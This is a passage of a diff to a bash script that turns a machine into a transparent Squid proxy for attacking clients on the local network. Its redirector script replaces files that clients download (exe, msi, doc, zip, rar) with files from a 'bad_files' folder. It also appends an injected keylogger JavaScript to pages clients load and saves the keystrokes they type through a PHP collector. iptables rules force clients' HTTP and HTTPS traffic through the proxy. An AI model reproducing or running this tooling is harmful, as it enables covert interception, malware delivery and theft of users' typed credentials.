-sed 's%system("/bin/cp", "$HOME_DIR/bad_files/test.doc","/var/www/files/$pid-$count.doc");%system("/bin/cp", "'$HOME_DIR'/bad_files/test.doc","/var/www/files/$pid-$count.doc");%g' /usr/local/bin/redirect.pl > /usr/local/bin/redirect1.pl && mv /usr/local/bin/redirect1.pl /usr/local/bin/redirect.pl
-sed 's%system("/bin/cp", "$HOME_DIR/bad_files/test.msi","/var/www/files/$pid-$count.msi");%system("/bin/cp", "'$HOME_DIR'/bad_files/test.msi","/var/www/files/$pid-$count.msi");%g' /usr/local/bin/redirect.pl > /usr/local/bin/redirect1.pl && mv /usr/local/bin/redirect1.pl /usr/local/bin/redirect.pl
+sed 's%system("/bin/cp", "$HOME_DIR/bad_files/test.exe","/var/www/html/files/$pid-$count.exe");%system("/bin/cp", "'$HOME_DIR'/bad_files/test.exe","/var/www/html/files/$pid-$count.exe");%g' /usr/local/bin/redirect.pl > /usr/local/bin/redirect1.pl && mv /usr/local/bin/redirect1.pl /usr/local/bin/redirect.pl
+sed 's%system("/bin/cp", "$HOME_DIR/bad_files/test.rar","/var/www/html/files/$pid-$count.rar");%system("/bin/cp", "'$HOME_DIR'/bad_files/test.rar","/var/www/html/files/$pid-$count.rar");%g' /usr/local/bin/redirect.pl > /usr/local/bin/redirect1.pl && mv /usr/local/bin/redirect1.pl /usr/local/bin/redirect.pl
+sed 's%system("/bin/cp", "$HOME_DIR/bad_files/test.zip","/var/www/html/files/$pid-$count.zip");%system("/bin/cp", "'$HOME_DIR'/bad_files/test.zip","/var/www/html/files/$pid-$count.zip");%g' /usr/local/bin/redirect.pl > /usr/local/bin/redirect1.pl && mv /usr/local/bin/redirect1.pl /usr/local/bin/redirect.pl
+sed 's%system("/bin/cp", "$HOME_DIR/bad_files/test.doc","/var/www/html/files/$pid-$count.doc");%system("/bin/cp", "'$HOME_DIR'/bad_files/test.doc","/var/www/html/files/$pid-$count.doc");%g' /usr/local/bin/redirect.pl > /usr/local/bin/redirect1.pl && mv /usr/local/bin/redirect1.pl /usr/local/bin/redirect.pl
+sed 's%system("/bin/cp", "$HOME_DIR/bad_files/test.msi","/var/www/html/files/$pid-$count.msi");%system("/bin/cp", "'$HOME_DIR'/bad_files/test.msi","/var/www/html/files/$pid-$count.msi");%g' /usr/local/bin/redirect.pl > /usr/local/bin/redirect1.pl && mv /usr/local/bin/redirect1.pl /usr/local/bin/redirect.pl
 
 # Make it executable
 chmod 755 /usr/local/bin/redirect.pl
 
-# Make dir /files/ in /var/www/ and if exist erase it's contents
-if [ ! -d /var/www/files ];then
-	mkdir /var/www/files
-	chown -R www-data:www-data /var/www
-	chmod -R 1777 /var/www
+# Make dir /files/ in /var/www/html/ and if exist erase it's contents
+if [ ! -d /var/www/html/files ];then
+	mkdir /var/www/html/files
+	chown -R www-data:www-data /var/www/html
+	chmod -R 1777 /var/www/html
 	usermod -aG proxy www-data;else
-	rm -r -f /var/www/files/*
+	rm -r -f /var/www/html/files/*
 fi
 
-# Make dir /sarg-realtime in /var/www/ Copy sarg-realtime.php to /var/www/sarg-realtime/ 
-if [  ! -d /var/www/sarg-realtime  ];then
-	mkdir /var/www/sarg-realtime
-	cp /usr/share/sarg/sarg-php/sarg-realtime.php /var/www/sarg-realtime/ 
-	chown -R www-data:www-data /var/www
-	chmod -R 1777 /var/www
+# Make dir /sarg-realtime in /var/www/html/ Copy sarg-realtime.php to /var/www/html/sarg-realtime/ 
+if [  ! -d /var/www/html/sarg-realtime  ];then
+	mkdir /var/www/html/sarg-realtime
+	cp /usr/share/sarg/sarg-php/sarg-realtime.php /var/www/html/sarg-realtime/ 
+	chown -R www-data:www-data /var/www/html
+	chmod -R 1777 /var/www/html
 	usermod -aG proxy www-data
 fi
 
 # Activate our redirect script in squid3.conf
 # url_rewrite_program /usr/local/bin/redirect.pl
 # redirect_children 
-sed 's%#url_rewrite_program %url_rewrite_program %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-sed 's%#redirect_children %redirect_children %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
+sed 's%#url_rewrite_program %url_rewrite_program %g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+sed 's%#redirect_children %redirect_children %g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
 
 # Start apache2 so it can serve real time reports from SARG to our localhost.
 /etc/init.d/apache2 start
@@ -7335,11 +7370,11 @@ $cecho "[ "$GREEN"ok"$END" ] Apache2 conf file: /etc/apache2/apache2.conf"
 
 if [ -n "`pidof squid3`" ];then
 	squid3 -k reconfigure
-	$cecho "[ "$GREEN"ok"$END" ] Squid3 conf file: /etc/squid3/squid.conf"
+	$cecho "[ "$GREEN"ok"$END" ] Squid3 conf file: /etc/squid/squid.conf"
 	$cecho "[ "$GREEN"ok"$END" ] Squid3 redirect script: /usr/local/bin/redirect.pl"
 else
-	/etc/init.d/squid3 restart
-	$cecho "[ "$GREEN"ok"$END" ] Squid HTTP Proxy 3.x conf file: /etc/squid3/squid.conf"
+	/etc/init.d/squid restart
+	$cecho "[ "$GREEN"ok"$END" ] Squid HTTP Proxy 3.x conf file: /etc/squid/squid.conf"
 	$cecho "[ "$GREEN"ok"$END" ] Squid3 redirect script: /usr/local/bin/redirect.pl"
 fi
 
@@ -7360,7 +7395,7 @@ iptables -t nat -A PREROUTING -i $IFACE -p tcp -m tcp --dport 80 -j REDIRECT --t
 sleep 3
 $necho "[....] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"
 sarg -r > /dev/null &
-$browser http://127.0.0.1/sarg-realtime/sarg-realtime.php &
+xdg-open http://127.0.0.1/sarg-realtime/sarg-realtime.php &
 $cecho "\r[ "$GREEN"ok"$END" ] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"
 echo
 echo "At this point you may want to replace (all or some of them)"
@@ -7694,7 +7729,7 @@ fi
 # HTTP proxy runs at 3128, Transparent HTTP runs at 3129 and Transparent HTTPS runs at 3127
 # localhost can access HTTP proxy at 3128
 
-cat > /etc/squid3/squid.conf <<EOF
+cat > /etc/squid/squid.conf <<EOF
 # Access Controls
 acl localnet src 192.168.60.0/24  	# RFC1918 class C internal network (192.168.60.0 to 192.168.60.255)
 acl safeports port 21 70 80 210 280 443 488 563 591 631 777 901 81 3127-3129 1025-65535
@@ -7748,18 +7783,18 @@ EOF
 
 if [ -n "`pidof squid3`" ];then
 	squid3 -k reconfigure
-	$cecho "[ "$GREEN"ok"$END" ] Squid3 conf file: /etc/squid3/squid.conf"
+	$cecho "[ "$GREEN"ok"$END" ] Squid3 conf file: /etc/squid/squid.conf"
 else
-	/etc/init.d/squid3 restart
-	$cecho "[ "$GREEN"ok"$END" ] Squid HTTP Proxy 3.x conf file: /etc/squid3/squid.conf"
+	/etc/init.d/squid restart
+	$cecho "[ "$GREEN"ok"$END" ] Squid HTTP Proxy 3.x conf file: /etc/squid/squid.conf"
 fi
 
-# Make dir /sarg-realtime in /var/www/ Copy sarg-realtime.php to /var/www/sarg-realtime/ 
-if [  ! -d /var/www/sarg-realtime  ];then
-	mkdir /var/www/sarg-realtime
-	cp /usr/share/sarg/sarg-php/sarg-realtime.php /var/www/sarg-realtime/ 
-	chown -R www-data:www-data /var/www
-	chmod -R 1777 /var/www
+# Make dir /sarg-realtime in /var/www/html/ Copy sarg-realtime.php to /var/www/html/sarg-realtime/ 
+if [  ! -d /var/www/html/sarg-realtime  ];then
+	mkdir /var/www/html/sarg-realtime
+	cp /usr/share/sarg/sarg-php/sarg-realtime.php /var/www/html/sarg-realtime/ 
+	chown -R www-data:www-data /var/www/html
+	chmod -R 1777 /var/www/html
 	usermod -aG proxy www-data
 fi
 
@@ -7784,7 +7819,7 @@ iptables -t nat -A PREROUTING -i $IFACE -p tcp -m tcp --dport 443 -j REDIRECT --
 sleep 3
 $necho "[....] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"
 sarg -r > /dev/null &
-$browser http://127.0.0.1/sarg-realtime/sarg-realtime.php &
+xdg-open http://127.0.0.1/sarg-realtime/sarg-realtime.php &
 $cecho "\r[ "$GREEN"ok"$END" ] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"
 
 echo
@@ -7822,11 +7857,11 @@ else
 fi
 
 
-# Make dir /var/www/inject or clean it.
-if [ ! -d /var/www/inject ];then
-	mkdir /var/www/inject
+# Make dir /var/www/html/inject or clean it.
+if [ ! -d /var/www/html/inject ];then
+	mkdir /var/www/html/inject
 else 
-	rm -r -f /var/www/inject/*
+	rm -r -f /var/www/html/inject/*
 fi
 
 # Which Java script code we should use?
@@ -7891,7 +7926,7 @@ function AJAXPost(cadena)
 kLogStart();
 EOF
 
-cat > /var/www/inject/getData.php << "EOF"
+cat > /var/www/html/inject/getData.php << "EOF"
 <?
 //$getData = $_GET["v"];
 $getData = $_POST["v"];
@@ -7911,12 +7946,12 @@ EOF
 	else
 		touch $HOME_DIR/Java_Inject/captured_data.txt
 	fi
-	chown www-data.www-data /var/www/inject
+	chown www-data.www-data /var/www/html/inject
 	chown -R www-data:www-data $HOME_DIR/Java_Inject/captured_data.txt
 	#chmod -R 1777 $HOME_DIR/Java_Inject/captured_data.txt
 	chmod 777 /$HOME_DIR/Java_Inject/captured_data.txt
 	#Replace $HOME_DIR with "$HOME_DIR" :-)
-	sed 's%$myFile = "captured_data.txt";%$myFile = "'$HOME_DIR'/Java_Inject/captured_data.txt";%g' /var/www/inject/getData.php > /var/www/inject/getData.php1 && mv /var/www/inject/getData.php1 /var/www/inject/getData.php
+	sed 's%$myFile = "captured_data.txt";%$myFile = "'$HOME_DIR'/Java_Inject/captured_data.txt";%g' /var/www/html/inject/getData.php > /var/www/html/inject/getData.php1 && mv /var/www/html/inject/getData.php1 /var/www/html/inject/getData.php
 elif [ "$Java_script" = "3" ];then
 	cp $custom_Java_script $HOME_DIR/Java_Inject/pasarela.js
 fi
@@ -7938,9 +7973,9 @@ while (<>)
 	{
 	
 		$url = $1;
-		system("/usr/bin/wget", "-q", "-O", "/var/www/tmp/$pid-$count.js", "$url");
-		system("chmod o+r /var/www/tmp/$pid-$count.js");
-		system("cat $HOME_DIR/Java_Inject/pasarela.js >> /var/www/tmp/$pid-$count.js");
+		system("/usr/bin/wget", "-q", "-O", "/var/www/html/tmp/$pid-$count.js", "$url");
+		system("chmod o+r /var/www/html/tmp/$pid-$count.js");
+		system("cat $HOME_DIR/Java_Inject/pasarela.js >> /var/www/html/tmp/$pid-$count.js");
 		print "http://192.168.60.129/tmp/$pid-$count.js\n";
 	}
 	else
@@ -7953,36 +7988,36 @@ EOF
 
 #Replace $HOME_DIR with "$HOME_DIR" :-)
 # See above cat.... "EOF"
-sed 's%system("cat $HOME_DIR/Java_Inject/pasarela.js >> /var/www/tmp/$pid-$count.js");%system("cat '$HOME_DIR'/Java_Inject/pasarela.js >> /var/www/tmp/$pid-$count.js");%g' /usr/local/bin/redirect.pl > /usr/local/bin/redirect1.pl && mv /usr/local/bin/redirect1.pl /usr/local/bin/redirect.pl
+sed 's%system("cat $HOME_DIR/Java_Inject/pasarela.js >> /var/www/html/tmp/$pid-$count.js");%system("cat '$HOME_DIR'/Java_Inject/pasarela.js >> /var/www/html/tmp/$pid-$count.js");%g' /usr/local/bin/redirect.pl > /usr/local/bin/redirect1.pl && mv /usr/local/bin/redirect1.pl /usr/local/bin/redirect.pl
 
 # Make it executable
 chmod 755 /usr/local/bin/redirect.pl
 
 
-# Make dir /tmp/ in /var/www/ and if exist erase it's contents
-if [ ! -d /var/www/tmp ];then
-	mkdir /var/www/tmp
-	chown -R www-data:www-data /var/www
-	chmod -R 1777 /var/www
+# Make dir /tmp/ in /var/www/html/ and if exist erase it's contents
+if [ ! -d /var/www/html/tmp ];then
+	mkdir /var/www/html/tmp
+	chown -R www-data:www-data /var/www/html
+	chmod -R 1777 /var/www/html
 	usermod -aG proxy www-data
 else
-	rm -r -f /var/www/tmp/*
+	rm -r -f /var/www/html/tmp/*
 fi
 
-# Make dir /sarg-realtime in /var/www/ Copy sarg-realtime.php to /var/www/sarg-realtime/ 
-if [  ! -d /var/www/sarg-realtime  ];then
-	mkdir /var/www/sarg-realtime
-	cp /usr/share/sarg/sarg-php/sarg-realtime.php /var/www/sarg-realtime/ 
-	chown -R www-data:www-data /var/www
-	chmod -R 1777 /var/www
+# Make dir /sarg-realtime in /var/www/html/ Copy sarg-realtime.php to /var/www/html/sarg-realtime/ 
+if [  ! -d /var/www/html/sarg-realtime  ];then
+	mkdir /var/www/html/sarg-realtime
+	cp /usr/share/sarg/sarg-php/sarg-realtime.php /var/www/html/sarg-realtime/ 
+	chown -R www-data:www-data /var/www/html
+	chmod -R 1777 /var/www/html
 	usermod -aG proxy www-data
 fi
 
 # Activate our redirect script in squid3.conf
 # url_rewrite_program /usr/local/bin/redirect.pl
 # redirect_children 
-sed 's%#url_rewrite_program %url_rewrite_program %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-sed 's%#redirect_children %redirect_children %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
+sed 's%#url_rewrite_program %url_rewrite_program %g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+sed 's%#redirect_children %redirect_children %g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
 
 # Start apache2 so it can serve real time reports from SARG to our localhost.
 /etc/init.d/apache2 start
@@ -7990,11 +8025,11 @@ $cecho "[ "$GREEN"ok"$END" ] Apache2 conf file: /etc/apache2/apache2.conf"
 
 if [ -n "`pidof squid3`" ];then
 	squid3 -k reconfigure
-	$cecho "[ "$GREEN"ok"$END" ] Squid3 conf file: /etc/squid3/squid.conf"
+	$cecho "[ "$GREEN"ok"$END" ] Squid3 conf file: /etc/squid/squid.conf"
 	$cecho "[ "$GREEN"ok"$END" ] Squid3 redirect script: /usr/local/bin/redirect.pl"
 else
-	/etc/init.d/squid3 restart
-	$cecho "[ "$GREEN"ok"$END" ] Squid HTTP Proxy 3.x conf file: /etc/squid3/squid.conf"
+	/etc/init.d/squid restart
+	$cecho "[ "$GREEN"ok"$END" ] Squid HTTP Proxy 3.x conf file: /etc/squid/squid.conf"
 	$cecho "[ "$GREEN"ok"$END" ] Squid3 redirect script: /usr/local/bin/redirect.pl"
 fi
 
@@ -8015,7 +8050,7 @@ iptables -t nat -A PREROUTING -i $IFACE -p tcp -m tcp --dport 80 -j REDIRECT --t
 sleep 3
 $necho "[....] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"
 sarg -r > /dev/null &
-$browser http://127.0.0.1/sarg-realtime/sarg-realtime.php &
+xdg-open http://127.0.0.1/sarg-realtime/sarg-realtime.php &
 $cecho "\r[ "$GREEN"ok"$END" ] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"
 echo
 $cecho "Your clients are now Transparently HTTP Proxied "$RED"BUT"$END" Squid will inject each"
